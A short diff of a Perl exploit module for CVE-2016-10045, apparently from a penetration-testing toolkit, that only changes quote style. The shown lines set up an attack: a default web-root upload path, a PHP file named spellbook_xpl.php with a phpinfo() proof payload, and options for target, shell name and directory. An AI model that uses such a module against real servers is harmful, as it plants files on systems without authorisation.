@@ -10,18 +10,18 @@ package Spellbook::Advisory::CVE_2016_10045 {
         my ($self, $parameters) = @_;
         my ($help, $target, @results);
         
-        my $dir   = "/var/www/html/uploads";
+        my $dir   = '/var/www/html/uploads';
         my %shell = (
-            "name" => "spellbook_xpl.php",
-            "code" => "<?php phpinfo(); ?>"
+            'name' => 'spellbook_xpl.php',
+            'code' => '<?php phpinfo(); ?>'
         );
 
         Getopt::Long::GetOptionsFromArray (
             $parameters,
-            "h|help"        => \$help,
-            "t|target=s"    => \$target,
-            "S|shell=s"     => \$shell{name},
-            "d|directory=s" => \$dir
+            'h|help'        => \$help,
+            't|target=s'    => \$target,
+            'S|shell=s'     => \$shell{name},
+            'd|directory=s' => \$dir
         );
         
         if ($target) {
